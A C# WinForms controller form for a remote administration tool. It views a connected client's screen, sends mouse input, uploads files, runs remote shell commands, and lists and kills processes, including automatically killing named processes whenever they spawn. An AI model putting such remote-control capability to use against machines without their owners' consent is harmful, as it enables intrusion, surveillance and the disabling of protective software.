using FlexiLeaf.Core.Network;
using FlexiLeaf.Core.Network.Packets;
using FlexiLeaf.Core.Operations;
using Giny.Core.DesignPattern;



namespace FlexiLeaf.ControlHub
{


    public partial class Form1 : Form, ISingleton<Form1>
    {
        private static Form1? _instance;
        public static Form1 Instance
        {
            get
            {
                if (_instance == null)
                {
                    _instance = new Form1();
                }
                return _instance;
            }
        }

        public Form1()
        {
            if (_instance != null)
            {
                return;
            }
            _instance = this;
            InitializeComponent();
            this.Load += Form1_Load;
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            var ipAddress = "127.0.0.1";
            var port = 27856;
            await TcpClient.Instance.Connect(ipAddress, port + 1, "123");
        }

        public void RefreshComboBox()
        {
            Form1.Instance.Invoke(new Action(Form1.Instance.refreshComboBox));
        }
        private void refreshComboBox()
        {
            comboBoxClients.DataSource = null;
            comboBoxClients.DataSource = Handlers.ServerHandlers.Clients;
        }

        private async void comboBoxClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ShowScreen.Checked = false;
            MouseMove.Checked = false;
            if (comboBoxClients.SelectedItem == null)
                return;
            if (TcpClient.Instance != null)
            {
                await TcpClient.Instance.Send(new ScreenPacket(false));
            }
            await TcpClient.Instance.Send(new SelectClient(comboBoxClients.SelectedItem.ToString()));
        }

        private async void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (this.ShowScreen.Checked)
            {
                await TcpClient.Instance.Send(new ScreenPacket(true));
            }
            else
            {
                await TcpClient.Instance.Send(new ScreenPacket(false));
            }
        }

        public void ChangeImage(Bitmap bitmap)
        {
            Form1.Instance.Invoke(new Action(() => Form1.Instance.changeImage(bitmap)));
        }

        private void changeImage(Bitmap bitmap)
        {
            if (pictureBox1 != null)
            {
                if (pictureBox1.Image != null)
                {
                    pictureBox1.Image.Dispose();
                }
                pictureBox1.Image = bitmap;
            }
        }

        private async void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            if (!ShowScreen.Checked)
                return;
            int x = -20;
            int y = -20;
            GetScreenMousePosition(e, ref x, ref y);
            if (e.Button == MouseButtons.Left)
            {
                await TcpClient.Instance.Send(new MousePacket(x, y, MouseOperations.MouseEventFlags.LeftDown));
            }
            else if (e.Button == MouseButtons.Right)
            {
                await TcpClient.Instance.Send(new MousePacket(x, y, MouseOperations.MouseEventFlags.RightDown));
            }
            else if (e.Button == MouseButtons.Middle)
            {
                await TcpClient.Instance.Send(new MousePacket(x, y, MouseOperations.MouseEventFlags.MiddleDown));
            }
        }

        private async void pictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            if (!ShowScreen.Checked)
                return;
            int x = -20;
            int y = -20;
            GetScreenMousePosition(e, ref x, ref y);
            if (e.Button == MouseButtons.Left)
            {
                await TcpClient.Instance.Send(new MousePacket(x, y, MouseOperations.MouseEventFlags.LeftUp));
            }
            else if (e.Button == MouseButtons.Right)
            {
                await TcpClient.Instance.Send(new MousePacket(x, y, MouseOperations.MouseEventFlags.RightUp));
            }
            else if (e.Button == MouseButtons.Middle)
            {
                await TcpClient.Instance.Send(new MousePacket(x, y, MouseOperations.MouseEventFlags.MiddleUp));
            }
        }

        private async void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            int x = -20;
            int y = -20;
            GetScreenMousePosition(e, ref x, ref y);
            if (this.MouseMove.Checked && ShowScreen.Checked)
                await TcpClient.Instance.Send(new MousePacket(x, y, MouseOperations.MouseEventFlags.Move));
        }

        private void GetScreenMousePosition(MouseEventArgs e, ref int X, ref int Y)
        {
            if (!ShowScreen.Checked)
                return;
            Point clickCoordinates = e.Location;
            int xImage = clickCoordinates.X;
            int yImage = clickCoordinates.Y;

            float imageWidth = pictureBox1.Width;
            float imageHeight = pictureBox1.Height;

            float screenWidth = pictureBox1.Image.Width;
            float screenHeight = pictureBox1.Image.Height;

            float widthDifference = screenWidth / imageWidth;
            float heightDifference = screenHeight / imageHeight;

            X = (int)(xImage * widthDifference);
            Y = (int)(yImage * heightDifference);
        }

        private void SendFiles_Click(object sender, EventArgs e)
        {

            Thread newThread = new Thread(new ThreadStart(ThreadMethod));
            newThread.SetApartmentState(ApartmentState.STA);
            newThread.Start();

        }

        private static TaskCompletionSource<bool> tcs = new TaskCompletionSource<bool>();

        private async static void ThreadMethod()
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = true;

            DialogResult result = openFileDialog.ShowDialog();

            if (result == DialogResult.OK)
            {
                string[] selectedFiles = openFileDialog.FileNames;
                Console.WriteLine("Send: " + selectedFiles.Length + " files");
                foreach (string file in selectedFiles)
                {
                    SendFilePacket filePacket = new SendFilePacket(file);
                    while (!filePacket.ReadFileInChunks())
                    {
                        await TcpClient.Instance.Send(filePacket);
                        await Task.Delay(10);
                    }
                    await TcpClient.Instance.Send(filePacket);
                }
            }
        }

        [PacketHandler]
        public static void HandleSendFilePacket(SendFilePacket packet, TcpClient Client)
        {
            if (!tcs.Task.IsCompleted)
            {
                tcs.SetResult(true);
            }
        }


        private async void SendCMD_Click(object sender, EventArgs e)
        {
            string cmd = CommandInput.Text;
            this.CommandInput.Text = "";
            await TcpClient.Instance.Send(new CommandPacket(cmd));

        }

        public void AddCommandDataText(string cmd)
        {
            Form1.Instance.Invoke(new Action(() => Form1.Instance._AddCommandDataText(cmd)));
        }

        private void _AddCommandDataText(string cmd)
        {
            CommandDataText.Text += cmd;
            CommandDataText.SelectionStart = CommandDataText.Text.Length;
            CommandDataText.ScrollToCaret();
        }

        private ListViewItem SelectedItem { get; set; }

        private async void KillProcess_Click(object sender, EventArgs e)
        {
            if (SelectedItem == null) return;

            ProcessPacket packet = new ProcessPacket(SelectedItem.SubItems[0].Text,
                int.Parse(SelectedItem.SubItems[1].Text),
                SelectedItem.SubItems[2].Text,
                SelectedItem.SubItems[3].Text,
                SelectedItem.SubItems[4].Text);
            await TcpClient.Instance.Send(new KillProcessPacket(packet));
            SelectedItem = null;
        }

        private List<string> KillsOnSpawns = new List<string>();

        private async void KillProcessOnSpawn_Click(object sender, EventArgs e)
        {
            if (SelectedItem == null) return;
            ProcessPacket packet = new ProcessPacket(SelectedItem.SubItems[0].Text,
                int.Parse(SelectedItem.SubItems[1].Text),
                SelectedItem.SubItems[2].Text,
                SelectedItem.SubItems[3].Text,
                SelectedItem.SubItems[4].Text);
            if (KillsOnSpawns.Contains(packet.Name))
                return;
            KillsOnSpawns.Add(packet.Name);
            SelectedItem = null;
            listViewKillOnSpawn.Items.Clear();
            foreach (string item in KillsOnSpawns)
            {
                ListViewItem listViewItem = new ListViewItem(item);
                listViewKillOnSpawn.Items.Add(listViewItem);
            }
            await TcpClient.Instance.Send(new KillProcessPacket(packet));
            await TcpClient.Instance.Send(new KillProcessOnSpawn(KillsOnSpawns));
        }

        private async void RemoveFromKillOnSpawn_Click(object sender, EventArgs e)
        {
            if (listViewKillOnSpawn.SelectedItems.Count > 0)
            {
                string selectedName = listViewKillOnSpawn.SelectedItems[0].Text;
                KillsOnSpawns.Remove(selectedName);
                listViewKillOnSpawn.Items.Clear();
                await TcpClient.Instance.Send(new KillProcessOnSpawn(KillsOnSpawns));
                foreach (string item in KillsOnSpawns)
                {
                    ListViewItem listViewItem = new ListViewItem(item);
                    listViewKillOnSpawn.Items.Add(listViewItem);
                }
            }
        }


        private void ListViewProcesses_ItemSelectionChanged(object sender, ListViewItemSelectionChangedEventArgs e)
        {
            if (e.IsSelected)
            {
                e.Item.BackColor = Color.FromArgb(100, Color.Blue);
                SelectedItem = e.Item;
            }
            else
            {
                SelectedItem = null;
                e.Item.BackColor = Color.Transparent;
            }
        }



        private bool isUpdatingProcess = false;
        private object updateProcessLock = new object();
        public void UpdateProcess(UpdateProcessPacket updateProcessPacket)
        {
            if (isUpdatingProcess)
            {
                return;
            }

            Form1.Instance.Invoke(new Action(() => Form1.Instance._UpdateProcessAsync(updateProcessPacket)));

        }



        private void _UpdateProcessAsync(UpdateProcessPacket updateProcessPacket)
        {
            lock (updateProcessLock)
            {
                listViewProcesses.BeginUpdate();
                isUpdatingProcess = true;
                HashSet<int> existingProcessIds = new HashSet<int>();

                foreach (ListViewItem item in listViewProcesses.Items)
                {
                    var processId = int.Parse(item.SubItems[1].Text);
                    existingProcessIds.Add(processId);

                    var process = updateProcessPacket.Process.FirstOrDefault(p => p.PID == processId);
                    if (process != null)
                    {
                        item.SubItems[0].Text = process.Name;
                        item.SubItems[2].Text = process.CPU;
                        item.SubItems[3].Text = process.RAM;
                        item.SubItems[4].Text = process.Network;
                    }
                    else
                    {
                        item.Remove();
                    }

                }

                // Ajouter les nouveaux processus
                foreach (var process in updateProcessPacket.Process)
                {
                    if (!existingProcessIds.Contains(process.PID))
                    {
                        string[] rowData = { process.Name, process.PID.ToString(), process.CPU, process.RAM, process.Network };
                        ListViewItem item = new ListViewItem(rowData);
                        listViewProcesses.Items.Add(item);

                    }
                }
                listViewProcesses.EndUpdate();
                isUpdatingProcess = false;
            }
        }






        private bool LoopUpdateProcess = false;
        private void TabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (tabControl.SelectedTab == this.ProcessManagement)
            {
                LoopUpdateProcess = true;
                Task.Run(async () =>
                {
                    while (LoopUpdateProcess)
                    {
                        await TcpClient.Instance.Send(new UpdateProcessPacket(new List<ProcessPacket>()));
                        await Task.Delay(1000);
                    }
                });
            }
        }

        private void TabControl_Deselecting(object sender, TabControlCancelEventArgs e)
        {
            if (e.TabPage == this.ProcessManagement)
            {
                LoopUpdateProcess = false;
            }
        }



        private void tabControl1_DrawItem(Object sender, DrawItemEventArgs e)
        {
            Graphics g = e.Graphics;
            TabPage tabPage = tabControlProcessGestion.TabPages[e.Index];
            Rectangle tabBounds = tabControlProcessGestion.GetTabRect(e.Index);

            bool isSelected = (e.State == DrawItemState.Selected);
            bool isHot = (e.State == (DrawItemState.Selected | DrawItemState.HotLight));

            // Définir les couleurs pour les onglets sélectionnés et non sélectionnés
            Color selectedTabColor = Color.White;
            Color unselectedTabColor = Color.FromArgb(0, Color.LightGray);

            // Remplir le fond de l'onglet avec la couleur appropriée
            using (SolidBrush brush = new SolidBrush(isSelected ? selectedTabColor : unselectedTabColor))
            {
                g.FillRectangle(brush, tabBounds);
            }

            // Définir la couleur du texte en fonction de l'état de l'onglet
            Color textColor = (isSelected || isHot) ? Color.Black : Color.Black;

            // Dessiner le texte de l'onglet
            using (Brush textBrush = new SolidBrush(textColor))
            {
                using (StringFormat stringFormat = new StringFormat())
                {
                    stringFormat.Alignment = StringAlignment.Center;
                    stringFormat.LineAlignment = StringAlignment.Center;
                    g.DrawString(tabPage.Text, e.Font, textBrush, tabBounds, stringFormat);
                }
            }
        }

        private async void HandHandKillOnSpawn_Click(object sender, EventArgs e)
        {
            string Name = NameOfNewKillOnSpawn.Text;
            NameOfNewKillOnSpawn.Text = string.Empty;
            KillsOnSpawns.Add(Name);
            listViewKillOnSpawn.Items.Clear();
            foreach (string item in KillsOnSpawns)
            {
                ListViewItem listViewItem = new ListViewItem(item);
                listViewKillOnSpawn.Items.Add(listViewItem);
            }
            await TcpClient.Instance.Send(new KillProcessOnSpawn(KillsOnSpawns));
        }
    }
}